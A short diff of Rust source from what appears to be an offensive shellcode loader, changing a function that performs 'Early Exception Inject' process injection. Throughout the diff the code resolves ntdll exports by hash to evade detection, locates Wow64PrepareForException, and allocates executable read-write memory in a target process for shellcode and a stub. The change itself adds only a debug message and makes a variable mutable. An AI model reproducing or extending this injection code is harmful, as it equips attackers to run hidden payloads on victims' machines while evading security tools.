@@ -16,6 +16,9 @@ const NT_TEST_ALERT_HASH: u32 = crate::dbj2_hash!(b"NtTestAlert");
 
 #[cfg(feature = "run_early_exception_inject")]
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
+    #[cfg(feature = "debug")]
+    crate::utils::print_message("Executing via Early Exception Inject...");
+    
     let ntdll = get_loaded_module_by_hash(NTDLL_HASH).ok_or("Failed to get ntdll")?;
     let wow64_prepare_for_exception = wow64::return_wow64_function_pointer(ntdll as *mut u8).ok_or("Failed to find Wow64PrepareForException")?;
     
@@ -26,7 +29,7 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     let shellcode_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, shellcode_len, PAGE_EXECUTE_READWRITE)?;
 
     // Allocate memory for stub
-    let stub_data = stub::get_stub();
+    let mut stub_data = stub::get_stub();
     let stub_size = stub_data.len();
     let stub_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, stub_size, PAGE_EXECUTE_READWRITE)?;
     let nt_protect_addr = get_export_by_hash(ntdll, NT_PROTECT_HASH).ok_or("NtProtectVirtualMemory not found")?;
